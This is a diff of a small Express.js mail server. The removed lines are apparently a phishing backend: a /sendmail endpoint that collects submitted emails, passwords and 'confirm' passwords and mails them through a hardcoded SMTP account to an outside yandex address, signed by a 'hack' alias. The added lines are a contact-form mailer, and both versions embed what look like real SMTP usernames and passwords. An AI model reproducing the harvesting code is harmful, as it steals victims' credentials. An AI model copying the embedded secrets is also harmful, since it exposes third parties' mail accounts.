@@ -2,49 +2,45 @@ const express = require("express");
 
 const app = express();
 
-const bodyParser = require("body-parser"); 
+const bodyParser = require("body-parser");
 const nodemailer = require("nodemailer");
-
-require("dotenv").config();
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
- 
 
 app.get("/", (req, res) => {
   res.send("api is run");
 });
 
-app.post("/sendmail",  async (req, res) => {
-  let { email, pass, pasers } = req.body;
-  const transport = nodemailer.createTransport({
-    host: "mail.zetolawyer.com",
-    port: 465,
-    auth: {
-      user: "zetobachri@zetolawyer.com",
-      pass: "L4wy3r.Muda",
-    },
-  });
+app.post("/sendmail", async (req, res) => {
+  const { name, email, message } = req.body;
 
-  await transport.sendMail({
-    from: "zetobachri@zetolawyer.com",
-    to: "easternmeridianhk@yandex.com|",
-    subject: "test email",
-    html: ` 
-    <div> 
-      <h2>Here is your email!</h2>
-        <p>Email: ${email}</p>
-        <p>Pass: ${pass}</p>
-        <p>Confirm Pass: ${pasers}</p>
-    
-        <p>All the best, xxxsonhack</p>
-         </div>
-     
-         
-    `,
-  });
+  try {
+    const transporter = nodemailer.createTransport({
+      host: "mail.whitetransport.net",
+      port: 465,
+
+      auth: {
+        user: "info@whitetransport.net", // generated ethereal user
+        pass: "B2hgrLr2GAna", // generated ethereal password
+      },
+    });
+
+    const mailOptions = {
+      from: "info@whitetransport.net",
+      to: "fredrick3smith33@gmail.com",
+      subject: "New message from your website!",
+      text: `Name: ${name}\nEmail: ${email}\nMessage: ${message}`,
+    };
+
+    await transporter.sendMail(mailOptions);
+    res.send("Email sent successfully");
+  } catch (error) {
+    console.error(error);
+    res.status(500).send("Error sending email");
+  }
 });
 
 const PORT = process.env.PORT || 5000;
 
-app.listen(PORT, console.log(`server in ${process.env.NODE_ENV} on ${PORT}`));
+app.listen(PORT, console.log(`server in on "5000"`));
